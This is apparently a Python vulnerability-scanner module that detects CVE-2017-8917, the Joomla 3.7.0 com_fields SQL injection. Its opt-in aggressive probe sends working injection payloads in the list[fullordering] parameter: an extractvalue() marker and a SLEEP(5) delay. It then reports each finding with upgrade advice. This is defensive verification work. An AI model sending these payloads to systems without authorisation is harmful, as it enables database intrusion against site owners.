from __future__ import annotations

import html
import re
import time
from typing import Any
from urllib.parse import urlencode

from ...core.http import HttpSession, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.probes import rand_str
from ...core.transcript import attach_transcript
from ...core.versions import parse_version_required, parse_version_safe
from .advisory import passive_core_finding

CVE_ID = "CVE-2017-8917"
NAME = "Joomla com_fields unauthenticated SQL injection"
AFFECTED_RULE = "Joomla 3.7.0"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["aggressive"]
DEFAULT_CONTEXT = "com_content.article"
SLEEP_SECONDS = 5
SLEEP_THRESHOLD = 3.5


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    affected = parse_version_required("3.7.0")
    if parsed == affected:
        return "LIKELY_VULNERABLE"
    return "PATCHED" if parsed > affected else "NOT_AFFECTED"


def _endpoint(context: str, payload: str) -> str:
    params = {
        "option": "com_fields",
        "view": "fields",
        "layout": "modal",
        "context": context,
        "list[fullordering]": payload,
    }
    return "/index.php?" + urlencode(params)


def _timed_get(sess: HttpSession, path: str, timeout: int) -> tuple[dict[str, Any], float]:
    started = time.monotonic()
    response = sess.request(path, method="GET", timeout=timeout, follow_redirects=False)
    return response, time.monotonic() - started


def _xpath_marker(body: str) -> str | None:
    decoded = html.unescape(body)
    match = re.search(r"XPATH syntax error:\s*'?~([^~]+)~'?", decoded, re.IGNORECASE)
    return match.group(1) if match else None


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    context: str = DEFAULT_CONTEXT,
) -> Finding:
    base = normalize_url(target_url)
    sess = HttpSession(base, timeout=timeout, proxy=proxy)
    marker = f"proofcms{rand_str(8)}"
    hex_marker = marker.encode("utf-8").hex()

    baseline, baseline_time = _timed_get(sess, _endpoint(context, "a.ordering"), timeout)
    if is_transport_error(baseline):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=(
                "The baseline com_fields request could not obtain an HTTP response "
                f"({transport_error_detail(baseline)})."
            ),
            action="Retry when the target is reachable; do not interpret transport failure as patch status.",
        )

    payload = f"extractvalue(1,concat(0x7e,0x{hex_marker},0x7e))"
    injected, injected_time = _timed_get(sess, _endpoint(context, payload), timeout)
    if is_transport_error(injected):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=(
                "The injected com_fields request could not obtain an HTTP response "
                f"({transport_error_detail(injected)})."
            ),
            action="Retry when the target is reachable; do not interpret transport failure as patch status.",
        )

    injected_body = str(injected.get("body", ""))
    leaked_marker = _xpath_marker(injected_body)
    error_signature = "XPATH syntax error" if leaked_marker is not None else ""

    evidence: dict[str, Any] = {
        "endpoint": "/index.php?option=com_fields&view=fields&layout=modal",
        "context": context,
        "marker": marker,
        "baseline_status": baseline.get("status"),
        "payload_status": injected.get("status"),
        "baseline_time": round(baseline_time, 3),
        "payload_time": round(injected_time, 3),
        "error_signature": error_signature,
    }

    if leaked_marker == marker:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=(
                "The unauthenticated com_fields list[fullordering] parameter evaluated an injected "
                f"extractvalue() expression and reflected the unique marker {marker}. This confirms "
                "CVE-2017-8917 with a read-only proof."
            ),
            action="Upgrade Joomla 3.7.0 to 3.7.1 or a currently supported release immediately.",
            evidence=attach_transcript(evidence, sess),
        )

    # Time-based corroboration when the selected context has at least one field.
    sleep_payload = f"a.ordering,(SELECT SLEEP({SLEEP_SECONDS}))"
    sleep_response, sleep_time = _timed_get(
        sess,
        _endpoint(context, sleep_payload),
        max(timeout, SLEEP_SECONDS + 5),
    )
    evidence["sleep_time"] = round(sleep_time, 3)
    evidence["sleep_status"] = sleep_response.get("status")
    if (
        not is_transport_error(sleep_response)
        and sleep_time >= SLEEP_SECONDS
        and sleep_time - baseline_time >= SLEEP_THRESHOLD
    ):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=(
                "The unauthenticated com_fields list[fullordering] parameter delayed the response "
                f"with an injected SLEEP({SLEEP_SECONDS}) expression "
                f"({round(sleep_time, 3)}s versus a {round(baseline_time, 3)}s baseline). "
                "This confirms CVE-2017-8917 with a read-only proof."
            ),
            action="Upgrade Joomla 3.7.0 to 3.7.1 or a currently supported release immediately.",
            evidence=attach_transcript(evidence, sess),
        )

    if injected.get("status") in {403, 406} and baseline.get("status") not in {403, 406}:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail="The injected request was blocked by an edge control while the baseline request was not.",
            action="Validate from a network path that is not filtered, or confirm the Joomla version manually.",
            evidence=evidence,
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component="Joomla core",
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        detail=(
            "Neither the extractvalue marker nor the SLEEP delay was observed. The target may be "
            "patched, may suppress database errors, or may not expose com_fields fields for the "
            "selected context."
        ),
        action="Verify the Joomla version and the com_fields context, then upgrade to 3.7.1 or newer.",
        evidence=evidence,
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    **kwargs: Any,
):
    finding = passive_core_finding(
        cve=CVE_ID,
        name=NAME,
        affected_rule=AFFECTED_RULE,
        joomla_version=joomla_version,
        classify=classify_version,
        remediation="Upgrade Joomla 3.7.0 to 3.7.1 or a currently supported release immediately.",
    )
    finding.exploit_available = HAS_EXPLOIT
    if not run_exploit_check:
        return finding
    if exploit_mode != "aggressive":
        finding.detail += " This CVE requires aggressive lab-only SQL injection verification."
        return finding
    if finding.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        finding.detail += " Aggressive proof skipped because the Joomla version was not potentially affected."
        return finding
    context = DEFAULT_CONTEXT
    if aggressive_command:
        value = aggressive_command.strip()
        if value and not value.startswith(("http://", "https://", "/")):
            context = value
    result = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy, context=context)
    result.component_version = finding.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": "Joomla core",
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": ["==3.7.0"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.1.0",
        "last_reviewed": "2026-11-08",
        "updated": "2026-11-08",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2017-8917",
            "https://developer.joomla.org/security-centre/692-20170501-core-sql-injection.html",
        ],
    }
